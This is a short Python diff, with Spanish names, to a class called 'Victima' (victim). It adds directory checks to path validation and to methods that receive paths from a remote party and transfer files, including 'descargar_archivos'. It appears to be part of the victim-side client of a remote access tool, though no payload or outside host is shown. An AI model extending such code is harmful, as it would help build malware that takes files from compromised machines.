@@ -173,7 +173,7 @@ class Victima(object):
 		if (ruta.pop()!=""):
 			verificar_ruta = signo.join(ruta)
 
-			if (os.path.exists(verificar_ruta)):
+			if (os.path.isdir(verificar_ruta)):
 				return True
 			else:
 				return False
@@ -246,6 +246,10 @@ class Victima(object):
 		ruta = self.recibir()
 		destino = ruta
 
+		if os.path.isdir(ruta):
+			self.enviar('directorio')
+			return False
+
 		if (self.control_ruta(ruta,"/")) or (self.control_ruta(ruta,"\\")):
 			self.enviar('ok')
 
@@ -270,7 +274,6 @@ class Victima(object):
 
 		return
 
-
 	def descargar_archivos(self):
 
 		# Envia el ok del modo
@@ -279,6 +282,10 @@ class Victima(object):
 		# Recibe ruta origen
 		path = self.recibir()
 		origen = path
+
+		if os.path.isdir(path):
+			self.enviar(str('-1'))
+			return False
 
 		if (self.control_ruta(path,"/")) or (self.control_ruta(path,"\\")):
 
